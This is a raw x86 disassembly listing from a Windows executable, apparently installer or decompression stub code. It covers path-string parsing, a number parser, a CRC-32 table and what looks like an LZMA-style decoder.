  40679e:	a3 ac a0 40 00       	mov    %eax,0x40a0ac
  4067a3:	c7 05 b0 a0 40 00 00 	movl   $0x423800,0x40a0b0
  4067aa:	38 42 00 
  4067ad:	89 0d b4 a0 40 00    	mov    %ecx,0x40a0b4
  4067b3:	ff 15 68 82 40 00    	call   *0x408268
  4067b9:	c2 08 00             	ret    $0x8
  4067bc:	ff 25 60 82 40 00    	jmp    *0x408260
  4067c2:	ff 25 58 81 40 00    	jmp    *0x408158
  4067c8:	68 00 04 00 00       	push   $0x400
  4067cd:	ff 74 24 0c          	push   0xc(%esp)
  4067d1:	ff 74 24 0c          	push   0xc(%esp)
  4067d5:	ff 15 88 80 40 00    	call   *0x408088
  4067db:	c2 08 00             	ret    $0x8
  4067de:	ff 25 a0 80 40 00    	jmp    *0x4080a0
  4067e4:	51                   	push   %ecx
  4067e5:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4067e9:	53                   	push   %ebx
  4067ea:	55                   	push   %ebp
  4067eb:	8b 2d a0 80 40 00    	mov    0x4080a0,%ebp
  4067f1:	56                   	push   %esi
  4067f2:	57                   	push   %edi
  4067f3:	50                   	push   %eax
  4067f4:	ff d5                	call   *%ebp
  4067f6:	8b 74 24 18          	mov    0x18(%esp),%esi
  4067fa:	8b f8                	mov    %eax,%edi
  4067fc:	56                   	push   %esi
  4067fd:	ff d5                	call   *%ebp
  4067ff:	3b c7                	cmp    %edi,%eax
  406801:	7c 3a                	jl     0x40683d
  406803:	8b 0d e0 80 40 00    	mov    0x4080e0,%ecx
  406809:	a1 f4 81 40 00       	mov    0x4081f4,%eax
  40680e:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406812:	89 44 24 18          	mov    %eax,0x18(%esp)
  406816:	ff 74 24 1c          	push   0x1c(%esp)
  40681a:	8a 1c 37             	mov    (%edi,%esi,1),%bl
  40681d:	56                   	push   %esi
  40681e:	c6 04 37 00          	movb   $0x0,(%edi,%esi,1)
  406822:	ff d1                	call   *%ecx
  406824:	88 1c 37             	mov    %bl,(%edi,%esi,1)
  406827:	85 c0                	test   %eax,%eax
  406829:	74 1c                	je     0x406847
  40682b:	56                   	push   %esi
  40682c:	ff 54 24 1c          	call   *0x1c(%esp)
  406830:	8b f0                	mov    %eax,%esi
  406832:	56                   	push   %esi
  406833:	ff d5                	call   *%ebp
  406835:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  406839:	3b c7                	cmp    %edi,%eax
  40683b:	7d d9                	jge    0x406816
  40683d:	33 c0                	xor    %eax,%eax
  40683f:	5f                   	pop    %edi
  406840:	5e                   	pop    %esi
  406841:	5d                   	pop    %ebp
  406842:	5b                   	pop    %ebx
  406843:	59                   	pop    %ecx
  406844:	c2 08 00             	ret    $0x8
  406847:	8b c6                	mov    %esi,%eax
  406849:	eb f4                	jmp    0x40683f
  40684b:	56                   	push   %esi
  40684c:	ff 74 24 08          	push   0x8(%esp)
  406850:	ff 15 1c 81 40 00    	call   *0x40811c
  406856:	8b f0                	mov    %eax,%esi
  406858:	83 fe ff             	cmp    $0xffffffff,%esi
  40685b:	74 10                	je     0x40686d
  40685d:	8b ce                	mov    %esi,%ecx
  40685f:	83 e1 fe             	and    $0xfffffffe,%ecx
  406862:	51                   	push   %ecx
  406863:	ff 74 24 0c          	push   0xc(%esp)
  406867:	ff 15 14 81 40 00    	call   *0x408114
  40686d:	8b c6                	mov    %esi,%eax
  40686f:	5e                   	pop    %esi
  406870:	c2 04 00             	ret    $0x4
  406873:	53                   	push   %ebx
  406874:	8b 1d f4 81 40 00    	mov    0x4081f4,%ebx
  40687a:	56                   	push   %esi
  40687b:	57                   	push   %edi
  40687c:	8b 7c 24 10          	mov    0x10(%esp),%edi
  406880:	57                   	push   %edi
  406881:	ff d3                	call   *%ebx
  406883:	8b f0                	mov    %eax,%esi
  406885:	56                   	push   %esi
  406886:	ff d3                	call   *%ebx
  406888:	8a 0f                	mov    (%edi),%cl
  40688a:	84 c9                	test   %cl,%cl
  40688c:	74 32                	je     0x4068c0
  40688e:	80 3e 3a             	cmpb   $0x3a,(%esi)
  406891:	75 0b                	jne    0x40689e
  406893:	80 7e 01 5c          	cmpb   $0x5c,0x1(%esi)
  406897:	75 05                	jne    0x40689e
  406899:	50                   	push   %eax
  40689a:	ff d3                	call   *%ebx
  40689c:	eb 24                	jmp    0x4068c2
  40689e:	80 f9 5c             	cmp    $0x5c,%cl
  4068a1:	75 1d                	jne    0x4068c0
  4068a3:	38 4f 01             	cmp    %cl,0x1(%edi)
  4068a6:	75 18                	jne    0x4068c0
  4068a8:	6a 02                	push   $0x2
  4068aa:	5e                   	pop    %esi
  4068ab:	6a 5c                	push   $0x5c
  4068ad:	50                   	push   %eax
  4068ae:	4e                   	dec    %esi
  4068af:	e8 ee f9 ff ff       	call   0x4062a2
  4068b4:	80 38 00             	cmpb   $0x0,(%eax)
  4068b7:	74 07                	je     0x4068c0
  4068b9:	40                   	inc    %eax
  4068ba:	85 f6                	test   %esi,%esi
  4068bc:	75 ed                	jne    0x4068ab
  4068be:	eb 02                	jmp    0x4068c2
  4068c0:	33 c0                	xor    %eax,%eax
  4068c2:	5f                   	pop    %edi
  4068c3:	5e                   	pop    %esi
  4068c4:	5b                   	pop    %ebx
  4068c5:	c2 04 00             	ret    $0x4
  4068c8:	68 00 04 00 00       	push   $0x400
  4068cd:	ff 74 24 08          	push   0x8(%esp)
  4068d1:	ff 74 24 10          	push   0x10(%esp)
  4068d5:	e8 b5 f8 ff ff       	call   0x40618f
  4068da:	83 c4 0c             	add    $0xc,%esp
  4068dd:	c3                   	ret
  4068de:	55                   	push   %ebp
  4068df:	8b ec                	mov    %esp,%ebp
  4068e1:	51                   	push   %ecx
  4068e2:	51                   	push   %ecx
  4068e3:	8b 45 08             	mov    0x8(%ebp),%eax
  4068e6:	53                   	push   %ebx
  4068e7:	56                   	push   %esi
  4068e8:	57                   	push   %edi
  4068e9:	8a 18                	mov    (%eax),%bl
  4068eb:	33 f6                	xor    %esi,%esi
  4068ed:	6a 0a                	push   $0xa
  4068ef:	33 ff                	xor    %edi,%edi
  4068f1:	c6 45 ff 39          	movb   $0x39,-0x1(%ebp)
  4068f5:	46                   	inc    %esi
  4068f6:	88 5d 0b             	mov    %bl,0xb(%ebp)
  4068f9:	59                   	pop    %ecx
  4068fa:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4068fd:	80 fb 2d             	cmp    $0x2d,%bl
  406900:	75 09                	jne    0x40690b
  406902:	8a 50 01             	mov    0x1(%eax),%dl
  406905:	83 ce ff             	or     $0xffffffff,%esi
  406908:	88 55 0b             	mov    %dl,0xb(%ebp)
  40690b:	80 fb 2d             	cmp    $0x2d,%bl
  40690e:	8d 50 01             	lea    0x1(%eax),%edx
  406911:	8b d9                	mov    %ecx,%ebx
  406913:	0f 45 d0             	cmovne %eax,%edx
  406916:	80 7d 0b 30          	cmpb   $0x30,0xb(%ebp)
  40691a:	75 22                	jne    0x40693e
  40691c:	42                   	inc    %edx
  40691d:	8a 02                	mov    (%edx),%al
  40691f:	3c 30                	cmp    $0x30,%al
  406921:	7c 0e                	jl     0x406931
  406923:	3c 37                	cmp    $0x37,%al
  406925:	7f 0a                	jg     0x406931
  406927:	6a 08                	push   $0x8
  406929:	5b                   	pop    %ebx
  40692a:	88 5d f8             	mov    %bl,-0x8(%ebp)
  40692d:	c6 45 ff 37          	movb   $0x37,-0x1(%ebp)
  406931:	24 df                	and    $0xdf,%al
  406933:	3c 58                	cmp    $0x58,%al
  406935:	75 07                	jne    0x40693e
  406937:	6a 10                	push   $0x10
  406939:	5b                   	pop    %ebx
  40693a:	88 5d f8             	mov    %bl,-0x8(%ebp)
  40693d:	42                   	inc    %edx
  40693e:	0f be 0a             	movsbl (%edx),%ecx
  406941:	42                   	inc    %edx
  406942:	83 f9 30             	cmp    $0x30,%ecx
  406945:	7c 0d                	jl     0x406954
  406947:	0f b6 45 ff          	movzbl -0x1(%ebp),%eax
  40694b:	3b c8                	cmp    %eax,%ecx
  40694d:	7f 05                	jg     0x406954
  40694f:	83 e9 30             	sub    $0x30,%ecx
  406952:	eb 19                	jmp    0x40696d
  406954:	80 7d f8 10          	cmpb   $0x10,-0x8(%ebp)
  406958:	75 1a                	jne    0x406974
  40695a:	8b c1                	mov    %ecx,%eax
  40695c:	83 e0 df             	and    $0xffffffdf,%eax
  40695f:	83 e8 41             	sub    $0x41,%eax
  406962:	83 f8 05             	cmp    $0x5,%eax
  406965:	77 0d                	ja     0x406974
  406967:	83 e1 07             	and    $0x7,%ecx
  40696a:	83 c1 09             	add    $0x9,%ecx
  40696d:	0f af fb             	imul   %ebx,%edi
  406970:	03 f9                	add    %ecx,%edi
  406972:	eb ca                	jmp    0x40693e
  406974:	0f af f7             	imul   %edi,%esi
  406977:	5f                   	pop    %edi
  406978:	8b c6                	mov    %esi,%eax
  40697a:	5e                   	pop    %esi
  40697b:	5b                   	pop    %ebx
  40697c:	c9                   	leave
  40697d:	c2 04 00             	ret    $0x4
  406980:	ff 74 24 04          	push   0x4(%esp)
  406984:	ff 15 a0 80 40 00    	call   *0x4080a0
  40698a:	03 44 24 04          	add    0x4(%esp),%eax
  40698e:	80 38 5c             	cmpb   $0x5c,(%eax)
  406991:	74 11                	je     0x4069a4
  406993:	50                   	push   %eax
  406994:	ff 74 24 08          	push   0x8(%esp)
  406998:	ff 15 70 82 40 00    	call   *0x408270
  40699e:	3b 44 24 04          	cmp    0x4(%esp),%eax
  4069a2:	77 ea                	ja     0x40698e
  4069a4:	c6 00 00             	movb   $0x0,(%eax)
  4069a7:	40                   	inc    %eax
  4069a8:	c2 04 00             	ret    $0x4
  4069ab:	51                   	push   %ecx
  4069ac:	53                   	push   %ebx
  4069ad:	55                   	push   %ebp
  4069ae:	56                   	push   %esi
  4069af:	8b 74 24 14          	mov    0x14(%esp),%esi
  4069b3:	57                   	push   %edi
  4069b4:	8a 1e                	mov    (%esi),%bl
  4069b6:	80 fb 5c             	cmp    $0x5c,%bl
  4069b9:	75 15                	jne    0x4069d0
  4069bb:	38 5e 01             	cmp    %bl,0x1(%esi)
  4069be:	75 10                	jne    0x4069d0
  4069c0:	80 7e 02 3f          	cmpb   $0x3f,0x2(%esi)
  4069c4:	75 0a                	jne    0x4069d0
  4069c6:	38 5e 03             	cmp    %bl,0x3(%esi)
  4069c9:	75 05                	jne    0x4069d0
  4069cb:	83 c6 04             	add    $0x4,%esi
  4069ce:	8a 1e                	mov    (%esi),%bl
  4069d0:	84 db                	test   %bl,%bl
  4069d2:	74 0f                	je     0x4069e3
  4069d4:	56                   	push   %esi
  4069d5:	e8 82 00 00 00       	call   0x406a5c
  4069da:	85 c0                	test   %eax,%eax
  4069dc:	74 05                	je     0x4069e3
  4069de:	83 c6 02             	add    $0x2,%esi
  4069e1:	8a 1e                	mov    (%esi),%bl
  4069e3:	8b ee                	mov    %esi,%ebp
  4069e5:	8b fe                	mov    %esi,%edi
  4069e7:	89 6c 24 10          	mov    %ebp,0x10(%esp)
  4069eb:	84 db                	test   %bl,%bl
  4069ed:	74 47                	je     0x406a36
  4069ef:	8b 2d f4 81 40 00    	mov    0x4081f4,%ebp
  4069f5:	88 5c 24 18          	mov    %bl,0x18(%esp)
  4069f9:	80 fb 1f             	cmp    $0x1f,%bl
  4069fc:	76 25                	jbe    0x406a23
  4069fe:	ff 74 24 18          	push   0x18(%esp)
  406a02:	68 08 87 40 00       	push   $0x408708
  406a07:	e8 96 f8 ff ff       	call   0x4062a2
  406a0c:	80 38 00             	cmpb   $0x0,(%eax)
  406a0f:	75 12                	jne    0x406a23
  406a11:	56                   	push   %esi
  406a12:	ff d5                	call   *%ebp
  406a14:	2b c6                	sub    %esi,%eax
  406a16:	50                   	push   %eax
  406a17:	56                   	push   %esi
  406a18:	57                   	push   %edi
  406a19:	e8 38 f9 ff ff       	call   0x406356
  406a1e:	57                   	push   %edi
  406a1f:	ff d5                	call   *%ebp
  406a21:	8b f8                	mov    %eax,%edi
  406a23:	56                   	push   %esi
  406a24:	ff d5                	call   *%ebp
  406a26:	8b f0                	mov    %eax,%esi
  406a28:	8a 1e                	mov    (%esi),%bl
  406a2a:	88 5c 24 18          	mov    %bl,0x18(%esp)
  406a2e:	84 db                	test   %bl,%bl
  406a30:	75 c7                	jne    0x4069f9
  406a32:	8b 6c 24 10          	mov    0x10(%esp),%ebp
  406a36:	c6 07 00             	movb   $0x0,(%edi)
  406a39:	57                   	push   %edi
  406a3a:	55                   	push   %ebp
  406a3b:	ff 15 70 82 40 00    	call   *0x408270
  406a41:	8b f8                	mov    %eax,%edi
  406a43:	8a 07                	mov    (%edi),%al
  406a45:	3c 20                	cmp    $0x20,%al
  406a47:	74 04                	je     0x406a4d
  406a49:	3c 5c                	cmp    $0x5c,%al
  406a4b:	75 07                	jne    0x406a54
  406a4d:	c6 07 00             	movb   $0x0,(%edi)
  406a50:	3b ef                	cmp    %edi,%ebp
  406a52:	72 e5                	jb     0x406a39
  406a54:	5f                   	pop    %edi
  406a55:	5e                   	pop    %esi
  406a56:	5d                   	pop    %ebp
  406a57:	5b                   	pop    %ebx
  406a58:	59                   	pop    %ecx
  406a59:	c2 04 00             	ret    $0x4
  406a5c:	8b 54 24 04          	mov    0x4(%esp),%edx
  406a60:	8a 0a                	mov    (%edx),%cl
  406a62:	80 c9 20             	or     $0x20,%cl
  406a65:	80 3a 5c             	cmpb   $0x5c,(%edx)
  406a68:	75 06                	jne    0x406a70
  406a6a:	80 7a 01 5c          	cmpb   $0x5c,0x1(%edx)
  406a6e:	74 0e                	je     0x406a7e
  406a70:	80 e9 61             	sub    $0x61,%cl
  406a73:	80 f9 19             	cmp    $0x19,%cl
  406a76:	77 0b                	ja     0x406a83
  406a78:	80 7a 01 3a          	cmpb   $0x3a,0x1(%edx)
  406a7c:	75 05                	jne    0x406a83
  406a7e:	33 c0                	xor    %eax,%eax
  406a80:	40                   	inc    %eax
  406a81:	eb 02                	jmp    0x406a85
  406a83:	33 c0                	xor    %eax,%eax
  406a85:	c2 04 00             	ret    $0x4
  406a88:	83 3d 8c 2b 42 00 00 	cmpl   $0x0,0x422b8c
  406a8f:	56                   	push   %esi
  406a90:	75 30                	jne    0x406ac2
  406a92:	33 c9                	xor    %ecx,%ecx
  406a94:	6a 08                	push   $0x8
  406a96:	8b d1                	mov    %ecx,%edx
  406a98:	5e                   	pop    %esi
  406a99:	8b c2                	mov    %edx,%eax
  406a9b:	24 01                	and    $0x1,%al
  406a9d:	0f b6 c0             	movzbl %al,%eax
  406aa0:	f7 d8                	neg    %eax
  406aa2:	1b c0                	sbb    %eax,%eax
  406aa4:	d1 ea                	shr    $1,%edx
  406aa6:	25 20 83 b8 ed       	and    $0xedb88320,%eax
  406aab:	33 d0                	xor    %eax,%edx
  406aad:	83 ee 01             	sub    $0x1,%esi
  406ab0:	75 e7                	jne    0x406a99
  406ab2:	89 14 8d 88 2b 42 00 	mov    %edx,0x422b88(,%ecx,4)
  406ab9:	41                   	inc    %ecx
  406aba:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  406ac0:	7c d2                	jl     0x406a94
  406ac2:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  406ac6:	8b 54 24 10          	mov    0x10(%esp),%edx
  406aca:	f7 d1                	not    %ecx
  406acc:	85 d2                	test   %edx,%edx
  406ace:	74 1c                	je     0x406aec
  406ad0:	8b 74 24 0c          	mov    0xc(%esp),%esi
  406ad4:	0f b6 06             	movzbl (%esi),%eax
  406ad7:	33 c1                	xor    %ecx,%eax
  406ad9:	c1 e9 08             	shr    $0x8,%ecx
  406adc:	0f b6 c0             	movzbl %al,%eax
  406adf:	33 0c 85 88 2b 42 00 	xor    0x422b88(,%eax,4),%ecx
  406ae6:	46                   	inc    %esi
  406ae7:	83 ea 01             	sub    $0x1,%edx
  406aea:	75 e8                	jne    0x406ad4
  406aec:	f7 d1                	not    %ecx
  406aee:	8b c1                	mov    %ecx,%eax
  406af0:	5e                   	pop    %esi
  406af1:	c2 0c 00             	ret    $0xc
  406af4:	81 ec b4 00 00 00    	sub    $0xb4,%esp
  406afa:	56                   	push   %esi
  406afb:	57                   	push   %edi
  406afc:	8b c1                	mov    %ecx,%eax
  406afe:	8d 7c 24 18          	lea    0x18(%esp),%edi
  406b02:	6a 22                	push   $0x22
  406b04:	59                   	pop    %ecx
  406b05:	8b f0                	mov    %eax,%esi
  406b07:	89 84 24 b8 00 00 00 	mov    %eax,0xb8(%esp)
  406b0e:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  406b10:	83 7c 24 70 ff       	cmpl   $0xffffffff,0x70(%esp)
  406b15:	75 08                	jne    0x406b1f
  406b17:	33 c0                	xor    %eax,%eax
  406b19:	40                   	inc    %eax
  406b1a:	e9 22 0d 00 00       	jmp    0x407841
  406b1f:	8b 84 24 88 00 00 00 	mov    0x88(%esp),%eax
  406b26:	8b 54 24 74          	mov    0x74(%esp),%edx
  406b2a:	8b 4c 24 58          	mov    0x58(%esp),%ecx
  406b2e:	8b bc 24 94 00 00 00 	mov    0x94(%esp),%edi
  406b35:	8b 74 24 60          	mov    0x60(%esp),%esi
  406b39:	89 84 24 ac 00 00 00 	mov    %eax,0xac(%esp)
  406b40:	8b 84 24 84 00 00 00 	mov    0x84(%esp),%eax
  406b47:	89 84 24 a8 00 00 00 	mov    %eax,0xa8(%esp)
  406b4e:	8b 44 24 54          	mov    0x54(%esp),%eax
  406b52:	89 84 24 a4 00 00 00 	mov    %eax,0xa4(%esp)
  406b59:	8a 44 24 45          	mov    0x45(%esp),%al
  406b5d:	53                   	push   %ebx
  406b5e:	8b 9c 24 94 00 00 00 	mov    0x94(%esp),%ebx
  406b65:	55                   	push   %ebp
  406b66:	8b 6c 24 64          	mov    0x64(%esp),%ebp
  406b6a:	88 44 24 1b          	mov    %al,0x1b(%esp)
  406b6e:	8b 44 24 20          	mov    0x20(%esp),%eax
  406b72:	c7 84 24 b8 00 00 00 	movl   $0x9,0xb8(%esp)
  406b79:	09 00 00 00 
  406b7d:	c7 84 24 bc 00 00 00 	movl   $0x8,0xbc(%esp)
  406b84:	08 00 00 00 
  406b88:	89 54 24 14          	mov    %edx,0x14(%esp)
  406b8c:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406b90:	83 f8 1c             	cmp    $0x1c,%eax
  406b93:	0f 87 a3 0c 00 00    	ja     0x40783c
  406b99:	ff 24 85 4c 78 40 00 	jmp    *0x40784c(,%eax,4)
  406ba0:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406ba4:	85 c0                	test   %eax,%eax
  406ba6:	0f 84 7c 0c 00 00    	je     0x407828
  406bac:	48                   	dec    %eax
  406bad:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406bb1:	8b 44 24 38          	mov    0x38(%esp),%eax
  406bb5:	8a 08                	mov    (%eax),%cl
  406bb7:	40                   	inc    %eax
  406bb8:	89 44 24 38          	mov    %eax,0x38(%esp)
  406bbc:	80 f9 e1             	cmp    $0xe1,%cl
  406bbf:	0f 87 77 0c 00 00    	ja     0x40783c
  406bc5:	33 d2                	xor    %edx,%edx
  406bc7:	0f b6 c1             	movzbl %cl,%eax
  406bca:	6a 2d                	push   $0x2d
  406bcc:	59                   	pop    %ecx
  406bcd:	f7 f1                	div    %ecx
  406bcf:	6a 09                	push   $0x9
  406bd1:	8b f0                	mov    %eax,%esi
  406bd3:	0f b6 c2             	movzbl %dl,%eax
  406bd6:	33 d2                	xor    %edx,%edx
  406bd8:	59                   	pop    %ecx
  406bd9:	f7 f1                	div    %ecx
  406bdb:	0f b6 ca             	movzbl %dl,%ecx
  406bde:	33 d2                	xor    %edx,%edx
  406be0:	42                   	inc    %edx
  406be1:	89 4c 24 6c          	mov    %ecx,0x6c(%esp)
  406be5:	8b ce                	mov    %esi,%ecx
  406be7:	d3 e2                	shl    %cl,%edx
  406be9:	8b c8                	mov    %eax,%ecx
  406beb:	4a                   	dec    %edx
  406bec:	89 94 24 b0 00 00 00 	mov    %edx,0xb0(%esp)
  406bf3:	89 94 24 8c 00 00 00 	mov    %edx,0x8c(%esp)
  406bfa:	33 d2                	xor    %edx,%edx
  406bfc:	42                   	inc    %edx
  406bfd:	d3 e2                	shl    %cl,%edx
  406bff:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  406c03:	4a                   	dec    %edx
  406c04:	89 94 24 b4 00 00 00 	mov    %edx,0xb4(%esp)
  406c0b:	89 94 24 90 00 00 00 	mov    %edx,0x90(%esp)
  406c12:	8d 0c 31             	lea    (%ecx,%esi,1),%ecx
  406c15:	be 00 03 00 00       	mov    $0x300,%esi
  406c1a:	d3 e6                	shl    %cl,%esi
  406c1c:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  406c23:	81 c6 36 07 00 00    	add    $0x736,%esi
  406c29:	8d 04 36             	lea    (%esi,%esi,1),%eax
  406c2c:	3b 44 24 30          	cmp    0x30(%esp),%eax
  406c30:	74 2f                	je     0x406c61
  406c32:	85 c9                	test   %ecx,%ecx
  406c34:	74 0a                	je     0x406c40
  406c36:	51                   	push   %ecx
  406c37:	ff 15 f0 80 40 00    	call   *0x4080f0
  406c3d:	8d 04 36             	lea    (%esi,%esi,1),%eax
  406c40:	50                   	push   %eax
  406c41:	6a 40                	push   $0x40
  406c43:	ff 15 f4 80 40 00    	call   *0x4080f4
  406c49:	8b c8                	mov    %eax,%ecx
  406c4b:	89 8c 24 a4 00 00 00 	mov    %ecx,0xa4(%esp)
  406c52:	85 c9                	test   %ecx,%ecx
  406c54:	0f 84 e2 0b 00 00    	je     0x40783c
  406c5a:	8d 04 36             	lea    (%esi,%esi,1),%eax
  406c5d:	89 44 24 30          	mov    %eax,0x30(%esp)
  406c61:	83 ee 01             	sub    $0x1,%esi
  406c64:	b8 00 04 00 00       	mov    $0x400,%eax
  406c69:	66 89 04 71          	mov    %ax,(%ecx,%esi,2)
  406c6d:	75 f2                	jne    0x406c61
  406c6f:	33 c9                	xor    %ecx,%ecx
  406c71:	33 f6                	xor    %esi,%esi
  406c73:	eb 29                	jmp    0x406c9e
  406c75:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406c79:	85 c0                	test   %eax,%eax
  406c7b:	0f 84 2a 0b 00 00    	je     0x4077ab
  406c81:	8b 54 24 38          	mov    0x38(%esp),%edx
  406c85:	48                   	dec    %eax
  406c86:	c1 e1 03             	shl    $0x3,%ecx
  406c89:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406c8d:	0f b6 02             	movzbl (%edx),%eax
  406c90:	d3 e0                	shl    %cl,%eax
  406c92:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  406c96:	0b f0                	or     %eax,%esi
  406c98:	42                   	inc    %edx
  406c99:	41                   	inc    %ecx
  406c9a:	89 54 24 38          	mov    %edx,0x38(%esp)
  406c9e:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  406ca2:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406ca6:	89 74 24 68          	mov    %esi,0x68(%esp)
  406caa:	83 f9 04             	cmp    $0x4,%ecx
  406cad:	7c c6                	jl     0x406c75
  406caf:	8b 44 24 34          	mov    0x34(%esp),%eax
  406cb3:	3b f0                	cmp    %eax,%esi
  406cb5:	74 32                	je     0x406ce9
  406cb7:	8b 84 24 a0 00 00 00 	mov    0xa0(%esp),%eax
  406cbe:	89 74 24 34          	mov    %esi,0x34(%esp)
  406cc2:	85 c0                	test   %eax,%eax
  406cc4:	74 07                	je     0x406ccd
  406cc6:	50                   	push   %eax
  406cc7:	ff 15 f0 80 40 00    	call   *0x4080f0
  406ccd:	56                   	push   %esi
  406cce:	6a 40                	push   $0x40
  406cd0:	ff 15 f4 80 40 00    	call   *0x4080f4
  406cd6:	89 84 24 a0 00 00 00 	mov    %eax,0xa0(%esp)
  406cdd:	85 c0                	test   %eax,%eax
  406cdf:	0f 84 57 0b 00 00    	je     0x40783c
  406ce5:	8b 44 24 34          	mov    0x34(%esp),%eax
  406ce9:	8b 8c 24 a0 00 00 00 	mov    0xa0(%esp),%ecx
  406cf0:	6a 05                	push   $0x5
  406cf2:	c6 44 01 ff 00       	movb   $0x0,-0x1(%ecx,%eax,1)
  406cf7:	59                   	pop    %ecx
  406cf8:	eb 29                	jmp    0x406d23
  406cfa:	8b 44 24 3c          	mov    0x3c(%esp),%eax
  406cfe:	85 c0                	test   %eax,%eax
  406d00:	0f 84 af 0a 00 00    	je     0x4077b5
  406d06:	8b 54 24 38          	mov    0x38(%esp),%edx
  406d0a:	48                   	dec    %eax
  406d0b:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  406d0f:	c1 e7 08             	shl    $0x8,%edi
  406d12:	0f b6 02             	movzbl (%edx),%eax
  406d15:	0b f8                	or     %eax,%edi
  406d17:	42                   	inc    %edx
  406d18:	89 bc 24 9c 00 00 00 	mov    %edi,0x9c(%esp)
  406d1f:	89 54 24 38          	mov    %edx,0x38(%esp)
  406d23:	8b c1                	mov    %ecx,%eax
  406d25:	49                   	dec    %ecx
  406d26:	89 4c 24 10          	mov    %ecx,0x10(%esp)
  406d2a:	89 4c 24 60          	mov    %ecx,0x60(%esp)
  406d2e:	85 c0                	test   %eax,%eax
  406d30:	75 c8                	jne    0x406cfa
  406d32:	8b 4c 24 48          	mov    0x48(%esp),%ecx
  406d36:	23 8c 24 b0 00 00 00 	and    0xb0(%esp),%ecx
  406d3d:	8b 44 24 70          	mov    0x70(%esp),%eax
  406d41:	c1 e0 04             	shl    $0x4,%eax
  406d44:	89 8c 24 ac 00 00 00 	mov    %ecx,0xac(%esp)
  406d4b:	03 c1                	add    %ecx,%eax
  406d4d:	89 4c 24 5c          	mov    %ecx,0x5c(%esp)
  406d51:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  406d58:	c7 44 24 24 06 00 00 	movl   $0x6,0x24(%esp)
  406d5f:	00 
  406d60:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  406d63:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  406d67:	e9 81 08 00 00       	jmp    0x4075ed
  406d6c:	85 f6                	test   %esi,%esi
  406d6e:	0f 85 8f 00 00 00    	jne    0x406e03
  406d74:	0f b6 54 24 4c       	movzbl 0x4c(%esp),%edx
  406d79:	6a 08                	push   $0x8
  406d7b:	58                   	pop    %eax
  406d7c:	8a c8                	mov    %al,%cl
  406d7e:	8b 44 24 48          	mov    0x48(%esp),%eax
  406d82:	2a 4c 24 6c          	sub    0x6c(%esp),%cl
  406d86:	23 84 24 b4 00 00 00 	and    0xb4(%esp),%eax
  406d8d:	d3 ea                	shr    %cl,%edx
  406d8f:	8b 4c 24 6c          	mov    0x6c(%esp),%ecx
  406d93:	d3 e0                	shl    %cl,%eax
  406d95:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  406d9c:	03 d0                	add    %eax,%edx
  406d9e:	69 c2 00 06 00 00    	imul   $0x600,%edx,%eax
  406da4:	81 c1 6c 0e 00 00    	add    $0xe6c,%ecx
  406daa:	03 c1                	add    %ecx,%eax
  406dac:	89 44 24 50          	mov    %eax,0x50(%esp)
  406db0:	8b 44 24 70          	mov    0x70(%esp),%eax
  406db4:	83 f8 04             	cmp    $0x4,%eax
  406db7:	7d 06                	jge    0x406dbf
  406db9:	21 74 24 70          	and    %esi,0x70(%esp)
  406dbd:	eb 11                	jmp    0x406dd0
  406dbf:	83 f8 0a             	cmp    $0xa,%eax
  406dc2:	7d 05                	jge    0x406dc9
  406dc4:	83 e8 03             	sub    $0x3,%eax
  406dc7:	eb 03                	jmp    0x406dcc
  406dc9:	83 e8 06             	sub    $0x6,%eax
  406dcc:	89 44 24 70          	mov    %eax,0x70(%esp)
  406dd0:	83 7c 24 74 00       	cmpl   $0x0,0x74(%esp)
  406dd5:	74 24                	je     0x406dfb
  406dd7:	8b 84 24 94 00 00 00 	mov    0x94(%esp),%eax
  406dde:	2b 44 24 14          	sub    0x14(%esp),%eax
  406de2:	8b 4c 24 34          	mov    0x34(%esp),%ecx
  406de6:	3b c1                	cmp    %ecx,%eax
  406de8:	72 02                	jb     0x406dec
  406dea:	03 c1                	add    %ecx,%eax
  406dec:	8b 8c 24 a0 00 00 00 	mov    0xa0(%esp),%ecx
  406df3:	33 ed                	xor    %ebp,%ebp
  406df5:	45                   	inc    %ebp
  406df6:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406df9:	eb 7f                	jmp    0x406e7a
  406dfb:	33 ed                	xor    %ebp,%ebp
  406dfd:	45                   	inc    %ebp
  406dfe:	e9 27 02 00 00       	jmp    0x40702a
  406e03:	8b 44 24 70          	mov    0x70(%esp),%eax
  406e07:	8b 8c 24 a4 00 00 00 	mov    0xa4(%esp),%ecx
  406e0e:	c7 44 24 74 01 00 00 	movl   $0x1,0x74(%esp)
  406e15:	00 
  406e16:	6a 07                	push   $0x7
  406e18:	8d 0c 41             	lea    (%ecx,%eax,2),%ecx
  406e1b:	81 c1 80 01 00 00    	add    $0x180,%ecx
  406e21:	58                   	pop    %eax
  406e22:	89 4c 24 54          	mov    %ecx,0x54(%esp)
  406e26:	89 44 24 24          	mov    %eax,0x24(%esp)
  406e2a:	e9 be 07 00 00       	jmp    0x4075ed
  406e2f:	8b 54 24 3c          	mov    0x3c(%esp),%edx
  406e33:	85 d2                	test   %edx,%edx
  406e35:	0f 84 84 09 00 00    	je     0x4077bf
  406e3b:	c1 e3 08             	shl    $0x8,%ebx
  406e3e:	4a                   	dec    %edx
  406e3f:	89 54 24 3c          	mov    %edx,0x3c(%esp)
  406e43:	8b 54 24 38          	mov    0x38(%esp),%edx
  406e47:	c1 e7 08             	shl    $0x8,%edi
